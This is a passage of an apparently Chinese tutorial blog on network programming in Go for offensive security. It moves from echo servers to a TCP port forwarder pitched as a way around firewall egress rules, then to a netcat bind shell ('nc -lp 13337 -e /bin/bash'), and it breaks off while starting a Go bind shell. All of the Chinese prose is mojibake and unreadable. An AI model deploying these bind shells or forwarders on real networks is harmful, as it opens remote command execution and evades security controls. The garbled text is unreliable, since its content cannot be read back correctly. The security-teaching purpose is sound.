<p>ä¹‹åï¼Œå°† Conn å®ä¾‹ä¼ é€’ç»™å¤„ç†å‡½æ•° echo(net.Conn)ã€‚è¯¥è°ƒç”¨ä»¥å…³é”®å­— go å¼€å¤´ï¼Œä½¿å…¶æˆä¸ºå¹¶å‘è°ƒç”¨ï¼Œä»¥ä¾¿åœ¨ç­‰å¾…å¤„ç†å‡½æ•°å®Œæˆæ—¶å…¶ä»–è¿æ¥ä¸ä¼šé˜»å¡ã€‚å¯¹äºè¿™æ ·ä¸€ä¸ªç®€å•çš„å›æ˜¾æœåŠ¡å™¨æ¥è¯´ï¼Œæ‰§è¡Œä»¥ä¸Šæ“ä½œå¯èƒ½å¹¶ä¸å®¹æ˜“ã€‚ä½†æˆ‘ä»¬ä¹‹æ‰€ä»¥ä¼šèŠ±ç¬”å¢¨å¯¹å…¶è¿›è¡Œä»‹ç»æ˜¯ä¸ºäº†è®©ä½ æ›´å¥½åœ°ç†è§£ Go å¹¶å‘æ¨¡å¼çš„ç®€å•æ€§ã€‚æ­¤æ—¶ï¼Œæœ‰ä¸¤ä¸ªè½»é‡çº§çº¿ç¨‹åœ¨åŒæ—¶è¿è¡Œã€‚</p>
<ul>
<li>ä¸»çº¿ç¨‹å¾ªç¯è¿”å›å¹¶åœ¨ listener.Accept() ç­‰å¾…å¦ä¸€ä¸ªè¿æ¥æ—¶é˜»å¡ã€‚</li>
<li>å¤„ç†ç¨‹åº goroutine çš„æ‰§è¡Œå·±è½¬ç§»åˆ°å‡½æ•° echo(net.Conn) ,ç»§ç»­è¿è¡Œå¹¶å¤„ç†æ•°æ®</li>
</ul>
<p>è¿™ä¸ªå›æ˜¾æœåŠ¡å™¨å°†å®¢æˆ·ç«¯å‘é€ç»™å®ƒçš„å†…å®¹å®Œå…¨é‡å¤åœ°å‘å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªç®€å•ã€æœ‰ç”¨çš„ä¾‹å­ã€‚</p>
<h3 id="23-é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç ">2.3 é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç <a hidden class="anchor" aria-hidden="true" href="#23-é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç ">#</a></h3>
<p>ä¸Šé¢çš„ç¤ºä¾‹å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ä¾èµ–ç›¸å½“ä½çº§çš„å‡½æ•°è°ƒç”¨ã€ç¼“å†²åŒºè·Ÿè¸ªä»¥åŠé‡å¤çš„è¯»/å†™ã€‚å…¶è¿è¡Œè¿‡ç¨‹å¾ˆä¹å‘³ä¸”å®¹æ˜“å‡ºé”™ã€‚ä¸è¿‡ï¼Œ Go è¿˜åŒ…å«å…¶ä»–ä¸€äº›å¯ä»¥ç®€åŒ–æ­¤è¿‡ç¨‹å¹¶é™ä½ä»£ç å¤æ‚æ€§çš„åŒ…ï¼Œå…·ä½“æ¥è¯´ï¼Œbufio åŒ…åŒ…è£…äº† Reader å’Œ Writer ,ä»¥åˆ›å»º I/Oç¼“å†²æœºåˆ¶ã€‚æ›´æ–°åçš„å‡½æ•° echoï¼ˆnet.Connï¼‰ä»¥åŠå¯¹æ­¤çš„è¯¦ç»†è®²è§£å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">ReadString</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Received %d bytes: %s&#34;</span>, len(<span style="color:#a6e22e">s</span>), <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Writing data&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewWriter</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">s</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">Flush</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ä¸å†æ˜¯ç›´æ¥åœ¨ Conn å®ä¾‹ä¸Šè°ƒç”¨å‡½æ•° Read([]byte) å’Œ Write([]byte),è€Œæ˜¯é€šè¿‡ NewReader(io.Reader) å’Œ NewWriter(io.Writer) åˆå§‹åŒ–æ–°çš„å¸¦ç¼“å†²çš„ Reader å’Œ Writer ã€‚è¿™äº›è°ƒç”¨éƒ½ä»¥ç°æœ‰çš„ Reader å’Œ Writer ä½œä¸ºå‚æ•°ï¼ˆè®°ä½ï¼ŒConnç±»å‹å®ç°äº†ä¸€äº›å¿…è¦çš„åŠŸèƒ½ï¼Œä½¿å…¶èƒ½åŒæ—¶è¢«è§†ä¸º Reader å’Œ Writer )ã€‚</p>
<p>ä¸¤ä¸ªç¼“å†²å®ä¾‹éƒ½å…·æœ‰ç”¨äºè¯»å–å’Œå†™å…¥å­—ç¬¦ä¸²æ•°æ®çš„åŠŸèƒ½ã€‚ReadString([]byte) å¸¦æœ‰ä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œç”¨äºè¡¨ç¤ºè¯»å–é•¿åº¦ï¼Œè€Œ WriteString([]byte) åˆ™å°†å­—ç¬¦ä¸²å†™å…¥å¥—æ¥å­—ã€‚å†™å…¥æ•°æ®æ—¶ï¼Œéœ€è¦æ˜¾å¼è°ƒç”¨ writer.Flush() ä»¥å°†æ‰€æœ‰æ•°æ®å†™å…¥åº•å±‚çš„ writer (åœ¨è¿™é‡Œä¸º Conn å®ä¾‹)ã€‚</p>
<p>å°½ç®¡å‰é¢çš„ç¤ºä¾‹é€šè¿‡ä½¿ç”¨ç¼“å†²çš„ I/O ç®€åŒ–äº†å…¶è¿è¡Œè¿‡ç¨‹ï¼Œä½†æ˜¯ä½ è¿˜å¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–æ­¤è¿‡ç¨‹ï¼Œè¦ç”¨åˆ°çš„å°±æ˜¯ä¾¿æ·å‡½æ•° Copy(Writer,Reader) ã€‚å¦‚å‰æ‰€è¿°ï¼Œè¿™ä¸ªå‡½æ•°å°† ç›®æ ‡Writer å’Œ æºReader ä½œä¸ºå‚æ•°ï¼Œåªéœ€è¦ä»æºå¤åˆ¶åˆ°ç›®æ ‡å³å¯ã€‚</p>
<p>åœ¨æ­¤ç¤ºä¾‹ä¸­,å°†å˜é‡ conn ä½œä¸ºæºå’Œç›®æ ‡ä¼ é€’,å› ä¸ºå°†åœ¨å»ºç«‹çš„è¿æ¥ä¸Šå›æ˜¾å†…å®¹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ä½¿ç”¨ io.Copy() å°†æ•°æ®ä» io.Reader å¤åˆ¶åˆ° io.Writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">conn</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read/write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>åˆ°è¿™é‡Œä½ å·²ç»äº†è§£äº† I/O çš„åŸºç¡€çŸ¥è¯†å¹¶èƒ½å°†å…¶åº”ç”¨äº TCP æœåŠ¡å™¨ä¸­ã€‚ç°åœ¨ç»§ç»­æ¢ç´¢æ›´å¤šæœ‰ç”¨çš„ç›¸å…³ç¤ºä¾‹ã€‚</p>
<h3 id="24-ä»£ç†ä¸€ä¸ªtcpå®¢æˆ·ç«¯">2.4 ä»£ç†ä¸€ä¸ªTCPå®¢æˆ·ç«¯<a hidden class="anchor" aria-hidden="true" href="#24-ä»£ç†ä¸€ä¸ªtcpå®¢æˆ·ç«¯">#</a></h3>
<p><strong>é€šè¿‡ç«¯å£è½¬å‘ç»•è¿‡é˜²ç«å¢™</strong></p>
<blockquote>
<p>æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸­é—´ç³»ç»Ÿä»£ç†è¿æ¥ç»•è¿‡æˆ–ç©¿é€é˜²ç«å¢™ä»è€Œé¿å¼€è¿™äº›é™åˆ¶ï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºç«¯å£è½¬å‘ã€‚</p>
</blockquote>
<p><img loading="lazy" src="image-20221208215653884.png" alt="image-20221208215653884"  />
</p>
<blockquote>
<p>å®¢æˆ·ç«¯é€šè¿‡é˜²ç«å¢™è¿æ¥åˆ°ç›®æ ‡ä¸»æœºstacktitan.comã€‚è¯¥ä¸»æœºé…ç½®ä¸ºå°†è¿æ¥è½¬å‘åˆ°ä¸»æœºevil.comã€‚å°½ç®¡é˜²ç«å¢™ç¦æ­¢ç›´æ¥è¿æ¥åˆ°evil.com,ä½†å¦‚æœæœ‰äº†ä¸Šé¢è¿™æ ·çš„é…ç½®ï¼Œå°±å¯ä»¥ä½¿å®¢æˆ·ç«¯ç»•è¿‡æ­¤ä¿æŠ¤æœºåˆ¶å»è®¿é—®evil.comã€‚</p>
</blockquote>
<p>ç°åœ¨ä½ å·±ç»æœ‰äº†åšå®çš„åŸºç¡€ï¼Œå¯ä»¥åˆ©ç”¨æ‰€å­¦çš„çŸ¥è¯†åˆ›å»ºä¸€ä¸ªç®€å•çš„ç«¯å£è½¬å‘å™¨ï¼Œä»¥é€šè¿‡ä»£ç†æœåŠ¡æˆ–ä¸»æœºä»£ç†å»ºç«‹è¿æ¥ã€‚å¦‚æœ¬ç« å‰é¢æ‰€è¿°ï¼Œè¿™å¯¹äºå°è¯•è§„é¿é™åˆ¶æ€§å‡ºå£æ§åˆ¶æˆ–åˆ©ç”¨ç³»ç»Ÿç»•è¿‡ç½‘ç»œåˆ†æ®µå¾ˆæœ‰ç”¨ã€‚</p>
<p>åœ¨ç¼–å†™ä»£ç ä¹‹å‰,è¯·å…ˆæ€è€ƒä¸‹é¢è¿™ä¸ªè™šæ„ä½†ç°å®çš„é—®é¢˜:</p>
<blockquote>
<p>Joe åœ¨ ACME Inc.æ‹…ä»»ä¸šåŠ¡åˆ†æå¸ˆä¸€èŒï¼Œç”±äºä»–çš„ç®€å†å†™å¾—å¾ˆæ¼‚äº®ï¼Œå› æ­¤æ‹¿åˆ°äº†å¯è§‚çš„è–ªæ°´ã€‚ä¸è¿‡ï¼Œåœ¨å·¥ä½œä¸­ï¼Œä»–è¡¨ç°ä¸ä½³ï¼Œç¼ºä¹å¹²åŠ²ã€‚ä»–æŠŠæœ¬è¯¥æŠ•å…¥å·¥ä½œä¸­çš„çƒ­æƒ…å…¨éƒ¨å€¾æ³¨åˆ°å®¶é‡Œçš„çŒ«èº«ä¸Šã€‚ä»–åœ¨å®¶é‡Œç»™çŒ«å®‰è£…äº†æ‘„åƒå¤´å¹¶å»ºç«‹äº†ä¸€ä¸ªç½‘ç«™ joescatcam.website ,ä»–å¯ä»¥é€šè¿‡å®ƒè¿œç¨‹ç›‘è§†ä»–çš„çŒ«ã€‚ä½†é—®é¢˜æ˜¯ Joe ç°åœ¨æ˜¯ä¸º ACME å·¥ä½œã€‚ACME è‚¯å®šä¸æƒ³è®©ä»–ä¸€å¤©24å°æ—¶éƒ½åœ¨ä½¿ç”¨å…¬å¸çš„ç½‘ç»œå¸¦å®½æŸ¥çœ‹ä»–çš„é«˜æ¸…æ‘„åƒå¤´ç›‘æ§çš„å…³äºçŒ«çš„è§†é¢‘ï¼›ACME ç”šè‡³ä¸è®©å…¶ä»–å‘˜å·¥è®¿é—® Joe åˆ›å»ºçš„ joescatcam.website ç½‘ç«™ã€‚</p>
<p>Joe æƒ³åˆ°ä¸€ä¸ªä¸»æ„ï¼Œå³â€œå¦‚æœæˆ‘ä½¿ç”¨è‡ªå·±æ§åˆ¶çš„åŸºäºäº’è”ç½‘çš„ç³»ç»Ÿæ„å»ºä¸€ä¸ªç«¯å£è½¬å‘å™¨ï¼Œæ˜¯å¦å¯ä»¥å¼ºåˆ¶å°†æ‰€æœ‰æµé‡ä»é‚£ä¸ªä¸»æœºé‡å®šå‘åˆ° joescatcam.website å‘¢â€ã€‚ç¬¬äºŒå¤©ï¼Œ Joe è¿›è¡Œäº†æµ‹è¯•å¹¶ç¡®è®¤ä»–å¯ä»¥è®¿é—®ä½äº joesproxy.com åŸŸçš„ä¸ªäººç½‘ç«™ã€‚Joe æœ¬æ¥åº”è¯¥å‚åŠ å½“å¤©ä¸‹åˆå¬å¼€çš„ä¸€ä¸ªä¼šè®®ï¼Œä½†ä»–æ²¡æœ‰å‚åŠ ï¼Œè€Œæ˜¯æ‰¾äº†ä¸€å®¶å’–å•¡åº—å¹¶åœ¨é‚£é‡Œè¿…é€Ÿä¸ºä»–çš„é—®é¢˜å¼€å‘äº†è§£å†³æ–¹æ¡ˆã€‚ä»–å°†æŠŠä» <a href="http://joesproxy.com">http://joesproxy.com</a> ä¸Šæ”¶åˆ°çš„æ‰€æœ‰æµé‡è½¬å‘åˆ°
<a href="http://joescatcam.website">http://joescatcam.website</a> ä¸Šã€‚</p>
</blockquote>
<p>ä»¥ä¸‹æ˜¯ Joe åœ¨ joesproxy.com æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ä»£ç ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">src</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dst</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;joescatcam.website:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to connect to our unreachable host&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">dst</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// åœ¨ goroutine ä¸­è¿è¡Œä»¥é˜²æ­¢ io.Copy è¢«é˜»å¡
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// å°†æºçš„è¾“å‡ºå¤åˆ¶åˆ°ç›®æ ‡
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">dst</span>, <span style="color:#a6e22e">src</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å°†ç›®æ ‡çš„è¾“å‡ºå¤åˆ¶å›æº
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">src</span>, <span style="color:#a6e22e">dst</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// åœ¨æœ¬åœ°ç«¯å£ 80 ä¸Šç›‘å¬
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>é¦–å…ˆçœ‹ Joe çš„ handle(net.Conn) å‡½æ•°ã€‚ Joe è¿æ¥åˆ° joescatcam.website ï¼ˆè®°ä½ï¼Œæ— æ³•ä» Joe å…¬å¸çš„ç”µè„‘ç›´æ¥è®¿é—®æ­¤ä¸»æœº)ã€‚ç„¶å Joe åˆ†åˆ«ä½¿ç”¨ä¸¤æ¬¡ Copy(Writer,Reader)ã€‚ç¬¬ä¸€ä¸ªå®ä¾‹ç¡®ä¿å°†æ¥è‡ªå…¥ç«™è¿æ¥çš„æ•°æ®å¤åˆ¶åˆ° joescatcam.website è¿æ¥ã€‚ç¬¬äºŒä¸ªå®ä¾‹ç¡®ä¿ä» joescatcam.website è¯»å–çš„æ•°æ®è¢«å†™å›åˆ°è¿æ¥å®¢æˆ·ç«¯çš„è¿æ¥ä¸­ã€‚å› ä¸º Copy(Writer,Reader) æ˜¯ä¸€ä¸ªé˜»å¡å‡½æ•°ï¼Œå¹¶ä¸”å°†ç»§ç»­é˜»å¡æ‰§è¡Œç›´åˆ°å…³é—­ç½‘ç»œè¿æ¥ï¼Œæ‰€ä»¥ Joe æ˜æ™ºåœ°å°†ä»– Copy(Writer,Reader) çš„ç¬¬ä¸€æ¬¡è°ƒç”¨åŒ…è£…åœ¨æ–°çš„ goroutine ä¸­ã€‚è¿™æ · handle(net.Conn) å‡½æ•°ä¸­çš„æ‰§è¡Œå°±å¾—ä»¥ç»§ç»­è¿›è¡Œï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œç¬¬äºŒ Copy(Writer,Reader) è°ƒç”¨ã€‚</p>
<p>Joe çš„ä»£ç†åœ¨ç«¯å£80ä¸Šç›‘å¬å¹¶ä¸­ç»§è¿æ¥åˆ° joescatcam.website:80 æ”¶å‘çš„æ‰€æœ‰æ•°æ®ã€‚Joe ç¡®è®¤ä»–å¯ä»¥ä½¿ç”¨ curl é€šè¿‡ joesproxy.com è¿æ¥åˆ° joescatcam.websiteã€‚æ¯”å¦‚ <code>curl -i -X GET http://joesproxy.com </code></p>
<h3 id="25-å¤ç°-netcat-å‘½ä»¤æ‰§è¡Œ">2.5 å¤ç° Netcat å‘½ä»¤æ‰§è¡Œ<a hidden class="anchor" aria-hidden="true" href="#25-å¤ç°-netcat-å‘½ä»¤æ‰§è¡Œ">#</a></h3>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†å¤ç° Netcat çš„ä¸€äº›å¾ˆæœ‰è¶£çš„åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯å®ƒçš„â€œå®‰å…¨å·¨æ´â€åŠŸèƒ½ã€‚
Netcat æ˜¯ TCP/IP ä¸Šçš„â€œç‘å£«å†›åˆ€â€ã€‚å…¶æœ¬è´¨ä¸Šå±äº Telnet çš„ä¸€ç§ï¼Œåªä¸è¿‡æ¯”èµ· Telnet,å®ƒæ›´çµæ´»ä¸”å¯ç¼–å†™è„šæœ¬ã€‚å®ƒåŒ…å«ä¸€é¡¹åœ¨ TCP ä¸Šé‡å®šå‘ä»»æ„ç¨‹åºçš„æ ‡å‡†è¾“å…¥(stdi)å’Œæ ‡å‡†è¾“å‡º(stdout)çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡å•ä¸€å‘½ä»¤æ‰§è¡Œæ¼æ´è®¿é—®æ“ä½œç³»ç»Ÿçš„ shell ã€‚å¯å‚è€ƒä»¥ä¸‹å‘½ä»¤ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lp <span style="color:#ae81ff">13337</span> -e /bin/bash
</span></span></code></pre></div><p>è¯¥å‘½ä»¤åœ¨ç«¯å£ 13337 ä¸Šåˆ›å»ºäº†ä¸€ä¸ªç›‘å¬å™¨ã€‚ä»»ä½•å¯èƒ½é€šè¿‡ Telnet è¿æ¥çš„è¿œç¨‹å®¢æˆ·ç«¯éƒ½å¯ä»¥æ‰§è¡Œä»»æ„ bash å‘½ä»¤ï¼Œå› æ­¤è¿™è¢«ç§°ä¸ºâ€œå®‰å…¨å·¨æ´â€ã€‚Netcat å…è®¸ä½ åœ¨ç¨‹åºç¼–è¯‘æœŸé—´æ ¹æ®éœ€è¦æ·»åŠ æ­¤åŠŸèƒ½ï¼ˆåœ¨æ ‡å‡†Linuâ…¸ç‰ˆæœ¬ä¸Šæ‰¾åˆ°çš„å¤§å¤šæ•° Netcat äºŒè¿›åˆ¶æ–‡ä»¶éƒ½ä¸åŒ…å«æ­¤åŠŸèƒ½)ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å‘ä½ å±•ç¤ºå¦‚ä½•åœ¨ Go ä¸­åˆ›å»ºå®ƒã€‚</p>
<p>é¦–å…ˆï¼ŒæŸ¥çœ‹ Go çš„ os/exec åŒ…ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å®ƒè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚è¯¥åŒ…å®šä¹‰äº†ä¸€ç§åä¸º Cmd çš„ç±»å‹ï¼Œå…¶ä¸­åŒ…å«è¿è¡Œå‘½ä»¤ä»¥åŠæ“ä½œ stdin å’Œ stdout æ‰€éœ€çš„æ–¹æ³•å’Œå±æ€§ã€‚è¿™é‡ŒæŠŠ stdin(ä¸€ä¸ªReader) å’Œ stdout((ä¸€ä¸ªWriter) é‡å®šå‘åˆ° Conn å®ä¾‹ï¼ˆæ—¢æ˜¯Readeråˆæ˜¯Writer)ã€‚</p>
<p>æ¥æ”¶åˆ°æ–°çš„è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨ os/exec ä¸­çš„å‡½æ•° Command(name string,arg&hellip;string) åˆ›å»ºæ–°çš„ Cmd å®ä¾‹ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤åŠå…¶ä»»ä½•é€‰é¡¹ä½œä¸ºå‚æ•°ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå°† /bin/sh ç¡¬ç¼–ç ä¸ºå‘½ä»¤å¹¶å°† -i ä½œä¸ºå‚æ•°ï¼Œä»¥ä½¿æˆ‘ä»¬å¤„äºäº¤äº’æ¨¡å¼ï¼Œè¿™æ ·å°±å¯ä»¥æ›´å¯é åœ°æ“ä½œ stdin å’Œ stdout ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>)
